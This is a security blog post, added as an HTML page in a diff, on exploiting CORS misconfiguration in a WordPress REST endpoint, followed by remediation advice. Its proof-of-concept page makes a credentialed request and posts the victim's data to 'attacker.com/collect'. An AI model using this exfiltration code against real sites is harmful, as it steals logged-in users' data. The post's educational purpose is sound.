@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration & Data Exfiltration - 0xb0rn3</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Share+Tech+Mono:wght@400&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #000000;
+            --bg-card: #1a1a1a;
+            --accent: #ffffff;
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0b0;
+            --border: #333333;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.08) 1px, transparent 0);
+            background-size: 20px 20px;
+            animation: binaryFlow 10s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes binaryFlow {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(20px); }
+        }
+
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            backdrop-filter: blur(20px);
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 2px solid var(--border);
+        }
+
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 6rem 2rem 3rem;
+        }
+
+        .terminal-prompt {
+            color: var(--accent);
+            font-family: 'Share Tech Mono', monospace;
+            margin-bottom: 2rem;
+            opacity: 0.6;
+        }
+
+        h1, h2 {
+            font-family: 'Orbitron', monospace;
+            color: var(--accent);
+        }
+
+        h1 { font-size: 2.5rem; margin-bottom: 1rem; }
+        h2 { font-size: 1.8rem; margin: 2rem 0 1rem; }
+
+        p { margin-bottom: 1.5rem; color: var(--text-secondary); }
+        strong { color: var(--text-primary); }
+        ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+        li { margin-bottom: 0.5rem; }
+
+        code {
+            background: var(--bg-card);
+            padding: 0.2rem 0.5rem;
+            border-radius: 3px;
+            font-family: 'JetBrains Mono', monospace;
+            border: 1px solid var(--border);
+        }
+
+        pre {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            padding: 1.5rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        pre code { background: none; border: none; padding: 0; }
+
+        figure {
+            margin: 2rem 0;
+            text-align: center;
+        }
+
+        figure img {
+            max-width: 100%;
+            border: 2px solid var(--border);
+            border-radius: 4px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent);
+            text-decoration: none;
+            font-family: 'Share Tech Mono', monospace;
+            margin-top: 3rem;
+            transition: gap 0.3s ease;
+        }
+
+        .back-link:hover { gap: 1rem; }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            .container { padding: 5rem 1.5rem 2rem; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav">
+        <div class="nav-content">
+            <a href="../main.html" class="logo">0xb0rn3</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="terminal-prompt">0xb0rn3@cors:~$</div>
+        
+        <h1>CORS Misconfiguration: Breaking the Same-Origin Policy</h1>
+
+        <h2>Understanding CORS</h2>
+        <p>Cross-Origin Resource Sharing (CORS) is a mechanism that allows browsers to make requests to domains other than the one serving the current page. By default, browsers enforce the same-origin policy, blocking cross-domain requests for security. CORS provides a way to selectively bypass this restriction.</p>
+
+        <p>When implemented correctly, CORS enables legitimate cross-domain communication. When misconfigured, it becomes an information disclosure vulnerability.</p>
+
+        <h2>Discovery Through Reconnaissance</h2>
+        <p>During directory enumeration, I identified a <code>wp-json</code> endpoint that caught my attention. WordPress REST API endpoints are common, but their CORS configuration often reveals security issues.</p>
+
+        <h2>Testing for Misconfiguration</h2>
+        <p>Testing CORS is straightforward. Add an <code>Origin</code> header to your request:</p>
+
+        <ol>
+            <li>Intercept the request in Burp Suite</li>
+            <li>Add header: <code>Origin: https://attacker.com</code></li>
+            <li>Send the request and examine the response headers</li>
+        </ol>
+
+        <p>A properly configured server will either reject the request or only allow specific, trusted origins. A misconfigured server will reflect the attacker-controlled origin back in the response.</p>
+
+        <figure>
+            <img src="../Images/cors.png" alt="CORS misconfiguration showing reflected origin">
+        </figure>
+
+        <p>The key indicator is in the response headers:</p>
+
+        <pre><code>Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Authorization, Content-Type</code></pre>
+
+        <p>When the server reflects the attacker's origin and includes <code>Access-Control-Allow-Credentials: true</code>, authenticated requests become possible from arbitrary origins. This breaks the security model browsers rely on to protect user data.</p>
+
+        <h2>Exploitation</h2>
+        <p>With CORS misconfigured, an attacker can craft a malicious page that makes authenticated requests to the vulnerable endpoint. When a victim visits the attacker's page while logged into the target site, their browser automatically includes authentication cookies.</p>
+
+        <p>Here's a proof-of-concept exploit:</p>
+
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;center&gt;
+    &lt;h2&gt;Data Exfiltration PoC&lt;/h2&gt;
+    &lt;button onclick='exploit()'&gt;Trigger&lt;/button&gt;
+    &lt;div id='output'&gt;&lt;/div&gt;
+    
+    &lt;script&gt;
+    function exploit() {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                var data = this.responseText;
+                document.getElementById("output").innerHTML = data;
+                
+                // Exfiltrate to attacker server
+                var exfil = new XMLHttpRequest();
+                exfil.open("POST", "https://attacker.com/collect", true);
+                exfil.send("data=" + encodeURIComponent(data));
+            }
+        };
+        
+        xhr.open("GET", "https://target.com/wp-json/sensitive-endpoint", true);
+        xhr.withCredentials = true;  // Include cookies
+        xhr.send();
+    }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <p>This page makes an authenticated request to the vulnerable endpoint, displays the response, and sends it to an attacker-controlled server. The victim sees a seemingly normal webpage. The attacker receives their sensitive data.</p>
+
+        <h2>Impact</h2>
+        <p>CORS misconfigurations enable several attack scenarios:</p>
+        <ul>
+            <li><strong>Authentication token theft</strong> from API responses</li>
+            <li><strong>Personal information disclosure</strong> from user profile endpoints</li>
+            <li><strong>Cross-site request forgery</strong> with response reading</li>
+            <li><strong>Session hijacking</strong> through reflected authentication data</li>
+        </ul>
+
+        <h2>Proper Configuration</h2>
+        <p>CORS should be configured with explicit allowlists of trusted origins. Never use:</p>
+        <ul>
+            <li>Wildcard origins with credentials enabled</li>
+            <li>Reflection of arbitrary <code>Origin</code> headers</li>
+            <li>Null origin acceptance</li>
+            <li>Overly permissive method and header allowances</li>
+        </ul>
+
+        <p>The same-origin policy exists for a reason. CORS provides controlled exceptions to that policy. Misconfiguring it defeats the security model browsers rely on to protect users.</p>
+
+        <a href="../blog.html" class="back-link">
+            <i class="fas fa-arrow-left"></i>
+            Back to Blog
+        </a>
+    </div>
+</body>
+</html>
